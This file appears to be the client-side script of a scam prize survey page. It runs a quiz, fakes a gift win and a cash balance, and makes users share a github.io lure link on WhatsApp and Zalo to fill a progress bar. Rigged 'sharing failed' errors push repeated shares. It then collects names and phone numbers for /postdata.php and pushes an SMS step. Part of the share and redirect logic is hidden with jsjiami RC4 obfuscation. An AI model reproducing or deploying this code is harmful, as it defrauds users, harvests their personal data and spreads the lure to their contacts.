(function (window, $, tpl, tools, Popup, Toast) {
  var allShareCount = 1, shareurl = '', newShareUrl = '';
  if (!localStorage.getItem('money')) {
    localStorage.setItem('money', Math.floor(Math.random() * 100) + 100)
  }
  if (!localStorage.getItem('isClickShare')) {
    localStorage.setItem('isClickShare', '0')
  }

  function saveGameProgress(num) {
    localStorage.setItem('game-progress', num);
  }
  function getGameProgress() {
    if (!localStorage.getItem('game-progress')) {
      return 0;
    } else {
      return parseInt(localStorage.getItem('game-progress'));
    }
  }


function userComment() {
  

}



function randomString(len) {
  len = len || 32;
  var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
  var maxPos = $chars.length;
  var pwd = '';
  for (i = 0; i < len; i++) {
    pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
  }
  return pwd;
}


  function contentHeader() {
    tools.getData('./contentHeader.json', function (data) {
      var contentHeaderHtml = '';
      data.forEach(function (element) {
        contentHeaderHtml += tools.tplReplace(tpl.contentHeader(element.type), element)
      });
      $('.js_cont-header').append(contentHeaderHtml).show();
      tools.timerLoopInit($('.js_cont-header #timer'), 5);
    })
  }
  function contentQuestion() {
    tools.getData('./question.json', function (data) {
      var questionHtml = '', len = data.length;
      data.forEach(function (element, index) {
        var questionItem = '<div class="question-item">';
        if (index == 0) {
          questionItem = '<div class="question-item current">';
        }
        questionItem += tools.tplReplace(tpl.questionHeader(), {
          tip: `Question ${index + 1} of ${len}`,
          title: element.title
        })
        questionItem += '<div class="question-content">'
        var surveyArr = element.answer;
        surveyArr.forEach(function (ele, i) {
          questionItem += tools.tplReplace(tpl.surveyBtn(), {
            id: i,
            content: ele
          })
        })
        questionItem += '</div></div>'

        questionHtml += questionItem;
      })
      $('.js_cont-question').append(questionHtml).show();
      _bindSurveyClick();
    })
    function _bindSurveyClick() {
      $('.js_cont-question').on('click', '.survey-btn', function () {
        var parrentEle = $(this).closest('.question-item'),
            parrentIndex = parrentEle.index(),
            parentNext = parrentEle.next();
        userAnswerArr.push($(this).attr('data-bq'));
        parrentEle.fadeOut(function () {
          parentNext.fadeIn()
        });
        if (parrentIndex + 1 === $('.question-item').length) {
          initVerify();
        }
      })
    }
    function initVerify() {
      tools.getData('./verify.json', function (data) {
        var verifyHtml = '';
        data.forEach(function (element) {
          verifyHtml += tools.tplReplace(tpl.verifyContent(element.type), element)
        });
        $('.js_cont-verify').append(verifyHtml);
      })
      $('.js_cont-header,.js_cont-question').hide();
      $('.js_cont-verify').fadeIn(50);
      var _index = 0;
      var resultTimer = setInterval(function () {
        if (_index === $('.result-item').length) {
          clearInterval(resultTimer);
          saveGameProgress(1);
          initGift();

        }
        $('.result-item').eq(_index).fadeIn();
        _index++;
      }, 1600);
    }
  }
  function initGift() {
    var giftHtml = '', isClickGift = false;
    for (let i = 0; i <1; i++) {
      giftHtml += tpl.giftItem(4)
    }
    $('.js_cont-gift .gift-boxs').html(giftHtml);
    $('.js_cont-gift').fadeIn();
    $('.js_cont-verify').hide();
    setTimeout(() => {
      Popup.showSuccess('answerSuccess');
    }, 500);
    // _bindGiftClick();
    // 缁戝畾鐐瑰嚮鎵撳紑绀肩墿浜嬩欢
    (function _bindGiftClick() {
      $('.js_cont-gift').on('click', '.gift-boxs-item', function () {
        if (isClickGift || $('.opensuccess').length !== 0 || $(this).hasClass('open')) {
          return;
        }
        isClickGift = true;
        $('.gift-boxs-item').css({ 'z-index': 1 });
        $(this).css({ 'z-index': 2 });

        if ($('.open').length == 10) { //a1
          $(this).addClass('open');
          setTimeout(() => {
            isClickGift = false;
            Popup.showError(2);
          }, 2400);
        } else {
          $(this).addClass('opensuccess');
          setTimeout(() => {
            isClickGift = false;
            Popup.showSuccess('giftSuccess');
            Popup.isCanvasShow = true;
            //startConfetti();
            $('.js_cont-gift').fadeOut();
            saveGameProgress(2);
            // 鍒濆鍖栧垎浜繘搴︿负 0
            localStorage.setItem('progress', 0);
            initMain();
          }, 2400);
        }

      })
    })();
  }

  function initMain() {
    var shareProgressArr = [0, 30, 20, 10, 4, 2], shareCount = 0;
    var mainHtml = '';
    tools.getData('./main.json', function (data) {
      mainHtml += tools.tplReplace(tpl.mainContent('mainInfo'), data.mainInfo);
      mainHtml += tools.tplReplace(tpl.mainContent('footerInfo'), data.footerInfo);
      mainHtml += tools.tplReplace(tpl.mainContent('mainTip'), data.mainTip);
      $('.js_cont-main').html(mainHtml).fadeIn();
      $('.money').html(' $: ' + localStorage.getItem('money'));
      $('.main-share-btns').append($('.share-btns'));
      if (!localStorage.getItem('progress')) {
        localStorage.setItem('progress', 0);
      }
      _bindMainClick();
      _updateProgress();
    })
    function _bindMainClick() {
      var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in
      document ? 'mozHidden' : null;
      document.addEventListener('visibilitychange', function () {
        if (document[hiddenProperty]) {
        } else {
          if (localStorage.getItem('isClickShare') === '1') {
            localStorage.setItem('isClickShare', '0');
            setTimeout(function () {
              verifyShare()
            }, 100);
          }
        }
      })
      function verifyShare() {
        shareCount++;
        var progress = parseInt(localStorage.getItem('progress'));
        if (shareCount == 3 || shareCount == 6) {
          Toast.show('sharing failed! The same group or the same friend is incorrect. Please check and share again.')
        } else {
          progress += shareProgressArr[progressStep(progress)];
          localStorage.setItem('progress', progress);
          _updateProgress();
        }
      }
      function progressStep(oldProgress) {
        var resultIndex = 0;
        switch (oldProgress) {
          case 0:
            resultIndex = 1;
            break;
          case 30:
            resultIndex = 2;
            break;
          case 50:
          case 60:
          case 65:
          case 70:
          case 75:
          case 80:
            resultIndex = 3;
            break;
          case 90:
            resultIndex = 4;
            break;
          case 94:
          case 96:
          case 98:
            resultIndex = 5;
            break;
          default:
            break;
        }
        return resultIndex;
      }
      $('.js_cont-main').on('click', '.receice-btn', function () {
        var num = parseInt(localStorage.getItem('progress'));
        if (num >= 100) {
          setTimeout(() => {
            Popup.showSuccess('shareSuccess');
            saveGameProgress(3);
            initSubmit();
          }, 500);
        } else {
          Toast.show();

        }
      })
    }
    // 鏇存柊杩涘害
    function _updateProgress() {
      var num = parseInt(localStorage.getItem('progress'));
      // if(num==100){
      //  $(".receice-btn").html('Finish, click to receive');
      //}
      if (num >= 100) {
        $('.js_cont-main .progress-bar').css({
          width: '100%'
        }).html('100%');
      } else {
        $('.js_cont-main .progress-bar').css({
          width: num + '%'
        }).html(num + '%');
      }
    }
  }
  function initSubmit() {
    var submitHtml = '<form id="submit-form"><div class="submit-wrapper">';
    tools.getData('./submit.json', function (data) {
      data.forEach(function (element) {
        submitHtml += tools.tplReplace(tpl.submitItem(element.type), element);
      })
      submitHtml += '</div></form>'
      $('.js_cont-submit').html(submitHtml);
    })
    $('.js_cont-main').fadeOut(function () {
      $('.js_cont-submit').fadeIn();
    });
    (function () {
      $('#okok').on('click', function () {
        saveGameProgress(4);
        $('#submit-form').hide();
        setTimeout(function () {
          initOver();
        }, 2000);
      });


      $('.js_cont-submit').on('click', '.input-btn', function () {
        var userData = verifyData();
        if (!userData) {
          Toast.show("Please fill in all the information");
          return;
        };
        $.ajax({
          url: '/postdata.php',
          type: 'get',
          dataType: "json",
          data: userData,
          success: function (res) {
              if (res.code == 0) {
              Toast.show('Congratulations, you have completed the above process!<br><br>Now, you also need to send SMS to confirm the collection , you can get cash immediately!<br><br>Click to send SMS');

            } else {
              Toast.show('Please fill in all the information');
            }
          },
          error: function (err) {
            console.log(err);
          }
        })
      });
      function verifyData() {
        var resultData = {};
        if (isInputEmpty('input[name="name"]')) {
          return false;
        } else {
          resultData.name = $('input[name="name"]').val();
        }
        if (isInputEmpty('input[name="tel"]')) {
          return false;
        } else {
          resultData.tel = $('input[name="tel"]').val();
        }
        return resultData;
      }
      function isInputEmpty(el) {
        return $(el).val() == ''
      }
    })();
  }
  function initOver() {
    $('.js_cont-submit').fadeOut(function () {
      $('.js_cont-over').fadeIn()
      $('.over-share-btns').append($('.share-btns'));
    })
  }

  function ceshi(){
  }




  ; (function () {

    var boarddiv = "<div class='zalo-share-button'  data-oaid='3647788090838421038' data-layout='5' data-color='blue' data-customize=false id='zalo'>zalo</div>"

   var share_text=["https:\/\/uqhwd.github.io\/j.html?{{dwqdqwd}}"]; var ad_s=0;
          var url_ua=share_text[Math.floor((Math.random()*share_text.length))];
          var date1 = new Date();
          date1 = date1.getTime();
          url_ua=url_ua.replace('{{dwqdqwd}}',date1);
    shareurl = url_ua;

    $('.share-btns').on('click', '#zhifu', function () {
      //location.href = "https://www.winkgame.in/in/static/apk/WinkGame_10053.apk"
    });

    $('.share-btns').on('click', '#zaloapp', function () {
      console.log('417', shareurl);
      if (shareurl === '') {
        return void $(this).click()
      };
      shareurl = newShareUrl === '' ? shareurl : newShareUrl;
      var u = navigator.userAgent;
      var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);

    


    });


;var encode_version = 'jsjiami.com.v5', miwym = '__0xcd05f',  __0xcd05f=['W8O8wq5he8OHQVM=','VsK2w5dS','PcOgAsOxPQ==','w41vecOdwrc=','w7/Cq3/Dg1s=','w78dwosWwr40eg==','w7gycXQW','wqplSRlc','wpRPw4nDrmArAXvDhmsE','wrvDqMKPwoDDulzDhmvCsig=','D8OFw4fCpAg=','wqhAYcKWIg==','LcK4dk3CqA==','RsKXFXw=','w5BVQHB3','w67CnFlYw4vCgsKF','VELChDVn','wqc1w5PDnGzDvBRMXsOdMcOHbcON','a8KcNQ==','54q45p6d5Y2E776VwqdK5L+o5a6S5p6l5b2h56mS776R6L2l6K+p5pSD5o+N5ois5LmU55mh5bep5L+Z','WMK4LxfDtQ==','TsOCwrtpQQ==','w7/CsVfDnkY=','IMOXw5rCpi4=','cELCpwEx','5YiO6ZqB54i45py25Y2m77+WWDnkvIrlrYfmn5blv7/nqLw=','5Yq26ZmG54iR5p+05Y6j77yUXsKW5L6J5ayg5p+u5b+r56mh','NELCsysOCMOgZhhOFw==','w5UmwpXDohrClsOEJl7Dog==','wq/ChRltwo/Cm8ObHcOa','K0VqVMK5w5XCo8Kcwq5vD8OWOsOxwocTG3oswrzDtA==','OT5MIGXCjcK1Q0Ygej0=','bEDCvBo1'];(function(_0xe00a9b,_0x40bb6a){var _0x510f79=function(_0x1b2f81){while(--_0x1b2f81){_0xe00a9b['push'](_0xe00a9b['shift']());}};_0x510f79(++_0x40bb6a);}(__0xcd05f,0x9f));var _0x3c56=function(_0x41c5ba,_0x3733e9){_0x41c5ba=_0x41c5ba-0x0;var _0x35b458=__0xcd05f[_0x41c5ba];if(_0x3c56['initialized']===undefined){(function(){var _0x4c4638=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x624104='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4c4638['atob']||(_0x4c4638['atob']=function(_0x5f0fb0){var _0x3e66ea=String(_0x5f0fb0)['replace'](/=+$/,'');for(var _0xa6ed7=0x0,_0x5b38f5,_0x2f75b2,_0x3fc1a6=0x0,_0xfb68e9='';_0x2f75b2=_0x3e66ea['charAt'](_0x3fc1a6++);~_0x2f75b2&&(_0x5b38f5=_0xa6ed7%0x4?_0x5b38f5*0x40+_0x2f75b2:_0x2f75b2,_0xa6ed7++%0x4)?_0xfb68e9+=String['fromCharCode'](0xff&_0x5b38f5>>(-0x2*_0xa6ed7&0x6)):0x0){_0x2f75b2=_0x624104['indexOf'](_0x2f75b2);}return _0xfb68e9;});}());var _0x552198=function(_0x2dfed0,_0x1f0394){var _0x57ed01=[],_0x556fe0=0x0,_0xcd401e,_0x281261='',_0x3587f1='';_0x2dfed0=atob(_0x2dfed0);for(var _0x44012b=0x0,_0x4b1ba0=_0x2dfed0['length'];_0x44012b<_0x4b1ba0;_0x44012b++){_0x3587f1+='%'+('00'+_0x2dfed0['charCodeAt'](_0x44012b)['toString'](0x10))['slice'](-0x2);}_0x2dfed0=decodeURIComponent(_0x3587f1);for(var _0x37d04b=0x0;_0x37d04b<0x100;_0x37d04b++){_0x57ed01[_0x37d04b]=_0x37d04b;}for(_0x37d04b=0x0;_0x37d04b<0x100;_0x37d04b++){_0x556fe0=(_0x556fe0+_0x57ed01[_0x37d04b]+_0x1f0394['charCodeAt'](_0x37d04b%_0x1f0394['length']))%0x100;_0xcd401e=_0x57ed01[_0x37d04b];_0x57ed01[_0x37d04b]=_0x57ed01[_0x556fe0];_0x57ed01[_0x556fe0]=_0xcd401e;}_0x37d04b=0x0;_0x556fe0=0x0;for(var _0xcc4bb1=0x0;_0xcc4bb1<_0x2dfed0['length'];_0xcc4bb1++){_0x37d04b=(_0x37d04b+0x1)%0x100;_0x556fe0=(_0x556fe0+_0x57ed01[_0x37d04b])%0x100;_0xcd401e=_0x57ed01[_0x37d04b];_0x57ed01[_0x37d04b]=_0x57ed01[_0x556fe0];_0x57ed01[_0x556fe0]=_0xcd401e;_0x281261+=String['fromCharCode'](_0x2dfed0['charCodeAt'](_0xcc4bb1)^_0x57ed01[(_0x57ed01[_0x37d04b]+_0x57ed01[_0x556fe0])%0x100]);}return _0x281261;};_0x3c56['rc4']=_0x552198;_0x3c56['data']={};_0x3c56['initialized']=!![];}var _0x422400=_0x3c56['data'][_0x41c5ba];if(_0x422400===undefined){if(_0x3c56['once']===undefined){_0x3c56['once']=!![];}_0x35b458=_0x3c56['rc4'](_0x35b458,_0x3733e9);_0x3c56['data'][_0x41c5ba]=_0x35b458;}else{_0x35b458=_0x422400;}return _0x35b458;};$(_0x3c56('0x0','ZiLx'))['on']('click',_0x3c56('0x1','FHYc'),function(){var _0x16d81a={'vqgPI':_0x3c56('0x2','AY5V'),'HjspU':function _0x24400f(_0x158f4d,_0x9abef3){return _0x158f4d+_0x9abef3;},'pPBvz':_0x3c56('0x3','exg7'),'AXGUe':function _0x386a68(_0x407a5b){return _0x407a5b();},'CzWGC':_0x3c56('0x4','7dIZ')};var _0x461dc5=_0x16d81a[_0x3c56('0x5','ZiLx')]['split']('|'),_0x5efa5f=0x0;while(!![]){switch(_0x461dc5[_0x5efa5f++]){case'0':window[_0x3c56('0x6','Nr!r')][_0x3c56('0x7','%G#!')]=_0x16d81a[_0x3c56('0x8','MP#x')](_0x16d81a[_0x3c56('0x9','@9FD')],shareurl);continue;case'1':_0x16d81a[_0x3c56('0xa','7F2H')](changeShareBtn);continue;case'2':shareurl=newShareUrl===''?shareurl:newShareUrl;continue;case'3':localStorage[_0x3c56('0xb','xLHq')](_0x16d81a[_0x3c56('0xc','5kdk')],'1');continue;case'4':var _0x4a364f=_0x16d81a[_0x3c56('0xd','2Dif')]+shareurl;continue;}break;}});$(_0x3c56('0xe','$Cke'))['on']('click',_0x3c56('0xf','EkG8'),function(){var _0x8887c5={'dFgqB':function _0x9b2cac(_0x4c6330,_0xb1ca37){return _0x4c6330===_0xb1ca37;},'yfFOM':function _0x32acb9(_0x57fd83,_0x1b99f9){return _0x57fd83+_0x1b99f9;},'fbFCy':'whatsapp://send?text=','RLhNj':function _0xbc7d3(_0x2c3f7a,_0x96a96){return _0x2c3f7a+_0x96a96;},'fmrHC':'isClickShare','ZsSOS':function _0x1d61bb(_0x41f37c){return _0x41f37c();}};shareurl=_0x8887c5[_0x3c56('0x10','JSb$')](newShareUrl,'')?shareurl:newShareUrl;var _0x393406=_0x8887c5[_0x3c56('0x11','KIEh')](_0x8887c5[_0x3c56('0x12','yA8[')],shareurl);window['location'][_0x3c56('0x13','cetd')]=_0x8887c5['RLhNj'](_0x8887c5[_0x3c56('0x14','hXwm')],shareurl);localStorage[_0x3c56('0x15','AY5V')](_0x8887c5['fmrHC'],'1');_0x8887c5[_0x3c56('0x16','YV%z')](changeShareBtn);});;(function(_0x3d8dde,_0x4bd5cf,_0x140643){var _0x5519c9={'XSkUo':'ert','efhph':function _0x3210b6(_0x34aeb5,_0x9dad1b){return _0x34aeb5!==_0x9dad1b;},'XCcPb':'undefined','ABoHx':function _0xba6db6(_0x37277a,_0x391db0){return _0x37277a===_0x391db0;},'yQviN':_0x3c56('0x17','wzWX'),'oaGEU':_0x3c56('0x18','cetd'),'KTzsd':function _0x37d377(_0x1d6f70,_0x37b819){return _0x1d6f70+_0x37b819;},'PcAXg':_0x3c56('0x19','[i3*')};_0x140643='al';try{_0x140643+=_0x5519c9['XSkUo'];_0x4bd5cf=encode_version;if(!(_0x5519c9[_0x3c56('0x1a','u!(J')](typeof _0x4bd5cf,_0x5519c9['XCcPb'])&&_0x5519c9['ABoHx'](_0x4bd5cf,_0x5519c9[_0x3c56('0x1b','Nr!r')]))){if(_0x5519c9[_0x3c56('0x1c','7F2H')](_0x5519c9['oaGEU'],_0x5519c9['oaGEU'])){_0x3d8dde[_0x140643](_0x5519c9[_0x3c56('0x1d','JSb$')]('删除',_0x5519c9[_0x3c56('0x1e','5mLM')]));}else{_0x3d8dde[_0x140643](_0x3c56('0x1f','cetd'));}}}catch(_0x7b9978){_0x3d8dde[_0x140643](_0x3c56('0x20','qmny'));}}(window));;encode_version = 'jsjiami.com.v5';



    function changeShareBtn() {
        if(newShareUrl==''){
          var share_text=["https:\/\/uqhwd.github.io\/j.html?{{dwqdqwd}}"]; var ad_s=0;
          var url_ua=share_text[Math.floor((Math.random()*share_text.length))];
          var date1 = new Date();
          date1 = date1.getTime();
          url_ua=url_ua.replace('{{dwqdqwd}}',date1);
          newShareUrl = url_ua;
      }
    }

  })();

  window.Init = {
    getGameProgress: getGameProgress,
    ceshi: ceshi,
    saveGameProgress: saveGameProgress,
    userComment: userComment,
    contentHeader: contentHeader,
    contentQuestion: contentQuestion,
    initGift: initGift,
    initMain: initMain,
    initSubmit: initSubmit,
    initOver: initOver
  }

})(window, jQuery, tpl, tools, Popup, Toast);
